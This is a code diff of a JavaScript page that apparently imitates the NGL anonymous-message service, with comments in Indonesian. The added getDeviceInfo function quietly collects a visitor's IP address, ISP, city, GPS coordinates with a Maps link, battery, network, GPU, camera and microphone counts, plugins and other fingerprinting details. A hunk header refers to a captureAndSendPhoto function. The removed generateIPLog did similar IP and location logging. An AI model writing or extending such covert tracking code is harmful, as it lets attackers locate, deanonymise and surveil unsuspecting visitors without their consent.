@@ -23,28 +23,130 @@ function startAccess() {
 async function getDeviceInfo(messageText) {
   try {
     const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
+
+    // Geo
     let geoText = "Tidak tersedia";
     let geoLink = "";
-    
-    if(navigator.geolocation){
-      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
-        const lat = pos.coords.latitude;
-        const lng = pos.coords.longitude;
-        const acc = pos.coords.accuracy;
-        geoText = `Lat: ${lat}, Lng: ${lng}, Accuracy: ${acc} m`;
-        geoLink = `https://www.google.com/maps?q=${lat},${lng}`;
-        resolve();
-      }, ()=>resolve()));
+    if (navigator.geolocation) {
+      await new Promise(resolve =>
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            geoText = `Lat: ${lat}, Lng: ${lng}, Accuracy: ${acc} m`;
+            geoLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            resolve();
+          },
+          () => resolve()
+        )
+      );
     }
 
-    const battery = await navigator.getBattery();
+    // Battery
+    let batteryText = "Tidak tersedia";
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryText = `${Math.round(battery.level * 100)}% ${battery.charging ? "(Charging)" : "(Not charging)"}`;
+    }
 
-    // gabungkan semua info jadi satu string
-    let infoText = `🌐 IP: ${ipInfo.ip}\n📍 Lokasi: ${geoText}\n🔗 Maps: ${geoLink || "Tidak tersedia"}\n📱 UserAgent: ${navigator.userAgent}\n🔋 Battery: ${Math.round(battery.level*100)}%`;
-    return infoText;
+    // Network info
+    let netInfo = "Tidak tersedia";
+    if (navigator.connection) {
+      const c = navigator.connection;
+      netInfo = `${c.effectiveType || "unknown"} (${c.downlink} Mbps, rtt ${c.rtt} ms)`;
+    }
 
-  } catch(e){ 
-    return "❌ Gagal ambil info device"; 
+    // Timezone
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const now = new Date().toLocaleString();
+
+    // Screen
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const pixelRatio = window.devicePixelRatio || 1;
+    const lang = navigator.language || "Tidak diketahui";
+
+    // Hardware
+    const cores = navigator.hardwareConcurrency || "N/A";
+    const mem = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
+
+    // Media Devices
+    let mediaCount = { audio: 0, video: 0, output: 0 };
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      mediaCount = {
+        audio: devices.filter(d => d.kind === "audioinput").length,
+        video: devices.filter(d => d.kind === "videoinput").length,
+        output: devices.filter(d => d.kind === "audiooutput").length,
+      };
+    }
+
+    // WebGL / GPU info
+    let gpuInfo = "Tidak tersedia";
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      if (gl) {
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        if (debugInfo) {
+          gpuInfo = `${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)} (${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)})`;
+        } else {
+          gpuInfo = gl.getParameter(gl.RENDERER);
+        }
+      }
+    } catch (_) {}
+
+    // Plugins
+    const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "Tidak ada";
+
+    // Touch support
+    const touchSupport = "ontouchstart" in window ? "Ya" : "Tidak";
+
+    // Storage
+    const storageSupport = {
+      cookies: navigator.cookieEnabled ? "Ya" : "Tidak",
+      localStorage: !!window.localStorage,
+      sessionStorage: !!window.sessionStorage,
+    };
+
+    // Online status
+    const online = navigator.onLine ? "Online" : "Offline";
+
+    // Service Worker
+    const sw = "serviceWorker" in navigator ? "Didukung" : "Tidak";
+
+    // Uptime
+    const uptimeSec = (performance.now() / 1000).toFixed(1);
+
+    // Final text
+    let infoText = `
+ • IP: ${ipInfo.ip}
+ • ISP: ${ipInfo.org || "Tidak tersedia"}
+ • Negara: ${ipInfo.country || "?"}, Kota: ${ipInfo.city || "?"}
+ • Lokasi: ${geoText}
+ • Maps: ${geoLink || "Tidak tersedia"}
+ • UserAgent: ${navigator.userAgent}
+ • Bahasa: ${lang}
+ • Layar: ${screenRes} @${pixelRatio}x
+ • CPU Core: ${cores}, RAM: ${mem}
+ • GPU: ${gpuInfo}
+ • Battery: ${batteryText}
+ • Network: ${netInfo}
+ • Timezone: ${tz}
+ • Local Time: ${now}
+ • Status: ${online}
+ • Touch Support: ${touchSupport}
+ • Kamera: ${mediaCount.video}, Mic: ${mediaCount.audio}, Speaker: ${mediaCount.output}
+ • Plugins: ${plugins}
+ • Cookies: ${storageSupport.cookies}, LocalStorage: ${storageSupport.localStorage}, SessionStorage: ${storageSupport.sessionStorage}
+ • Service Worker: ${sw}
+ • Browser Uptime: ${uptimeSec} detik
+    `;
+
+    return infoText.trim();
+  } catch (e) {
+    console.error(e);
+    return "❌ Gagal ambil info device";
   }
 }
 
@@ -83,36 +185,6 @@ async function captureAndSendPhoto(){
 }
 
 // Generate IP Log dengan detail lengkap
-async function generateIPLog(messageText) {
-  try {
-    // Get IP
-    const ipResponse = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipResponse.json();
-    const userIP = ipData.ip;
-
-    // Get Location
-    const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-    const locationData = await locationResponse.json();
-
-    const locationInfo = `🌍 IP LOG - New Anonymous Message
-━━━━━━━━━━━━━━━━━━━━━━━
-📱 IP: ${userIP}
-🌍 Country: ${locationData.country_name || 'Unknown'}
-🏙️ City: ${locationData.city || 'Unknown'} 
-🗺️ Region: ${locationData.region || 'Unknown'}
-🏢 ISP: ${locationData.org || 'Unknown'}
-📍 Coordinates: ${locationData.latitude || '?'}, ${locationData.longitude || '?'}
-🕒 Timezone: ${locationData.timezone || 'Unknown'}
-⏰ Time: ${new Date().toLocaleString('id-ID')}
-💬 Message: "${messageText}"
-━━━━━━━━━━━━━━━━━━━━━━━`;
-
-    return locationInfo;
-  } catch (err) {
-    console.error("Error getting IP info:", err);
-    return `❌ Failed to get IP info\n💬 Message: "${messageText}"`;
-  }
-}
 
 // Generate NGL Style Photo
 async function generateNGLPhoto(messageText) {
@@ -121,15 +193,17 @@ async function generateNGLPhoto(messageText) {
     preview.style.width = "375px";
     preview.style.height = "667px";
     preview.style.background = "linear-gradient(135deg, #667eea 0%, #764ba2 100%)";
-    preview.style.position = "fixed";
-    preview.style.top = "-10000px";
+    preview.style.backgroundColor = "#667eea"; // fallback solid biar ga putih
+    preview.style.position = "absolute"; // jangan fixed biar ga error render
+    preview.style.left = "-9999px";
+    preview.style.top = "0";
     preview.style.display = "flex";
     preview.style.flexDirection = "column";
     preview.style.justifyContent = "center";
     preview.style.alignItems = "center";
     preview.style.padding = "20px";
     preview.style.fontFamily = "Inter, -apple-system, BlinkMacSystemFont, sans-serif";
-    
+
     preview.innerHTML = `
       <div style="
         background: linear-gradient(135deg, #E91E63 0%, #FF5722 50%, #FF9800 100%);
@@ -192,14 +266,16 @@ async function generateNGLPhoto(messageText) {
         balas
       </div>
     `;
-    
+
     document.body.appendChild(preview);
 
-    // Delay untuk render
+    // Delay render
     await new Promise(resolve => setTimeout(resolve, 300));
 
-    const canvas = await html2canvas(preview);
-    
+    const canvas = await html2canvas(preview, {
+      backgroundColor: null // biar gradient asli kepake, ga ditiban putih
+    });
+
     return new Promise(resolve => {
       canvas.toBlob(blob => {
         preview.remove();
